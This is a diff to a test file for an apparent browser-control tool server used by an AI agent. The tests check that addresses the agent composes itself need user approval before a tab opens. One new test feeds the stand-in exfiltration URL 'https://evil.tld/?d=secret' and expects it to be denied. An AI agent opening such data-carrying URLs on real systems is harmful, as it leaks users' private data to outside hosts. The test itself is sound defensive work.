@@ -301,6 +301,7 @@ test("without an active tab → Aucun onglet actif.", async () => {
 });
 
 test("open_tab on an outside site then read_tab → authorization request", async () => {
+  policy.grantAddress("https://mail.google.com");
   const id = text(await client.callTool({ name: "open_tab", arguments: { url: "https://mail.google.com" } })).trim();
   const r = await client.callTool({ name: "read_tab", arguments: { id } });
   expect(text(r)).toBe("Accès refusé par l'utilisateur à cet onglet.");
@@ -416,6 +417,7 @@ test("launch_app: window left on the old port after the delay, no access granted
 test("navigate an app window to another site: tab opened, the window and its access stay", async () => {
   await withApplications(fakeApp({ state: "running", port: 5280 }), [appTodo]);
   await client.callTool({ name: "launch_app", arguments: { folder: "todo" } });
+  policy.grantAddress("https://exemple.test/");
   const r = await client.callTool({ name: "navigate", arguments: { id: "app:todo", url: "https://exemple.test/" } });
   const isOpen = bridge.calls.find((a) => a.method === "openTab");
   expect(isOpen?.args[0]).toBe("https://exemple.test/");
@@ -2427,8 +2429,9 @@ test("a fragment the agent adds to a link read is dropped: navigate and read_pag
   }, { address: true });
 });
 
-test("open_tab during a search asks the card for an address not read (with its reason); local and read addresses, or no search, ask nothing", async () => {
-  await withSearch(async ({ call, fake }) => {
+test("open_tab during a search asks the card for an address not read (with its reason); local and read addresses ask nothing", async () => {
+  await withSearch(async ({ call, fake, policy }) => {
+    policy.grantAddress("https://ailleurs.fr/");
     expect((await call("open_tab", { url: "https://ailleurs.fr/" })).isError).toBe(false);
     fake.linkSequence = [[a]];
     await call("search_web", { query: "x" });
@@ -2443,6 +2446,31 @@ test("open_tab during a search asks the card for an address not read (with its r
     await call("search_web", { query: "x" });
     expect((await call("open_tab", { url: "https://ailleurs.fr/x", reason: "pour voir" })).isError).toBe(false);
     expect(fake.calls.filter((x) => x.method === "openTab").map((x) => x.args[0])).toEqual(["https://ailleurs.fr/x"]);
+  }, { address: true });
+});
+
+test("outside a search, a composed address asks its card once per conversation; refused, nothing opens; read, local or a readable tab's address is free", async () => {
+  await withSearch(async ({ call, fake }) => {
+    expect((await call("open_tab", { url: "https://evil.tld/?d=secret", reason: "voir" })).text).toBe(DENIAL_TEXT);
+    expect(fake.calls.find((x) => x.method === "askAddress")!.args[0]).toEqual({ url: "https://evil.tld/?d=secret", reason: "voir", agent: "L'agent" });
+    expect((await call("navigate", { id: "github", url: "https://evil.tld/?d=secret" })).text).toBe(DENIAL_TEXT);
+    expect(fake.calls.filter((x) => x.method === "openTab" || x.method === "navigate")).toHaveLength(0);
+    expect(fake.calls.filter((x) => x.method === "askAddress")).toHaveLength(2);
+    // Free: local, read in a page (read_tab gives its links), the address of a tab it may read, a link by number.
+    expect((await call("open_tab", { url: "http://localhost:3000/" })).isError).toBe(false);
+    await call("read_tab", { id: "github" });
+    expect((await call("open_tab", { url: "https://exemple.fr/a" })).isError).toBe(false);
+    expect((await call("open_tab", { url: github.url })).isError).toBe(false);
+    expect(fake.calls.filter((x) => x.method === "askAddress")).toHaveLength(2);
+  }, { address: false, allow: true });
+  await withSearch(async ({ call, fake, policy }) => {
+    expect((await call("open_tab", { url: "https://ailleurs.fr/x", reason: "r" })).isError).toBe(false);
+    expect((await call("open_tab", { url: "https://ailleurs.fr/x" })).isError).toBe(false);
+    expect(fake.calls.filter((x) => x.method === "askAddress")).toHaveLength(1);
+    // A new conversation asks again.
+    policy.reset();
+    await call("open_tab", { url: "https://ailleurs.fr/x" });
+    expect(fake.calls.filter((x) => x.method === "askAddress")).toHaveLength(2);
   }, { address: true });
 });
 
@@ -2727,6 +2755,7 @@ describe("agent activity", () => {
   test("read_tab, navigate and capture_screen say what they do, with the host without www.", async () => {
     await startActivity();
     await client.callTool({ name: "read_tab", arguments: { id: "lbc" } });
+    policy.grantAddress("https://www.exemple.fr/y");
     await client.callTool({ name: "navigate", arguments: { id: "lbc", url: "https://www.exemple.fr/y" } });
     await client.callTool({ name: "capture_screen", arguments: { id: "lbc" } });
     expect(seenActivity).toEqual([
